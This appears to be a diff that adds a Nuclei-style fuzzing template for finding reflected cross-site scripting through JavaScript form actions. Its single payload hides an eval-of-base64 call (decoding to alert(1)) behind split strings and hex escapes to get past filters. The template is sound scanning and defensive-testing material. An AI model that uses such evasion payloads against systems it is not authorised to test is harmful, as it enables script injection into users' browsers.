@@ -1,0 +1,39 @@
+id: fuzz-xss-javascript-action
+
+info:
+  name: JavaScript Form Action XSS Detection
+  author: netbaan
+  severity: low
+  description: |
+    This template is designed to detect XSS vulnerabilities via JavaScript actions in form submissions.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      xss_payload:
+        - "<form><button formaction=javascript:top['ev'+'al'](self['\\x61\\x74\\x6f\\x62'](`YWxlcnQoMSk7`));//</button></form>"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xss_payload}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{xss_payload}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
